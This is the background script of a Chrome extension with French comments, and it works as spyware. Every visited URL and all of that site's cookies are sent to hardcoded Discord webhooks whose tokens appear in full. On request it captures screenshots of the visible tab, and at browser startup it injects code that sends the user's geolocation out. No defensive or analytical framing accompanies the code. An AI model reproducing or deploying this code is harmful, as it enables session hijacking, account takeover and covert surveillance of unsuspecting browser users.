// 1. Envoie chaque URL visitée + cookies complets
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.startsWith("http")) {
    fetch("https://discord.com/api/webhooks/1362038340538466445/dTK5OEJ6iTxLEpUdRaDehOYqte4upxZSW0G0gF2cQzX81iYymBsSsNHIBzRfYqDZ4Ruy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🔗 Nouveau site visité : ${tab.url}`
      })
    });

    chrome.cookies.getAll({ url: tab.url }, function (cookies) {
      const detailedCookies = cookies.map((cookie, index) => ({
        ...cookie,
        id: index + 1
      }));

      fetch("https://discord.com/api/webhooks/1362038936360452259/w5bBfYl1GYvfjDT59suhnuiolc2v6XHvoycNmF8BnfVwKtZKrr3IU_-2s58twq81xchs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🍪 **Cookies du site : ${tab.url}**`,
          embeds: [{
            title: "Cookies détectés",
            description: "```json\n" + JSON.stringify(detailedCookies, null, 2) + "\n```"
          }]
        })
      });
    });
  }
});

// 2. Capture d’écran déclenchée depuis le content script
chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.action === "capture" && msg.url) {
    chrome.tabs.captureVisibleTab(null, { format: "png" }, function (dataUrl) {
      fetch("https://discord.com/api/webhooks/1362038729186738216/hE24aPmgwR35PTiMannngijV4TEhezOOH-A86WISs-dJp_vaZBKcU8Pds0h4K0PCzELT", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📸 Capture d'écran de : ${msg.url}`,
          embeds: [{
            image: { url: dataUrl }
          }]
        })
      });
    });
  }
});

// 3. Géolocalisation au lancement de Chrome
chrome.runtime.onStartup.addListener(() => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs.length > 0) {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          navigator.geolocation.getCurrentPosition((position) => {
            const { latitude, longitude } = position.coords;
            fetch("https://discord.com/api/webhooks/1362097109054263418/_8M1nyvLM8W4EGP7-TG4M8mBNU8f73xAylI7qecSzHd3Ge1vhySsFCpCq9GxYqSuSxau", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                content: `📍 **Localisation au lancement :**
Latitude : ${latitude}
Longitude : ${longitude}
https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`
              })
            });
          });
        },
        world: "MAIN"
      });
    }
  });
});
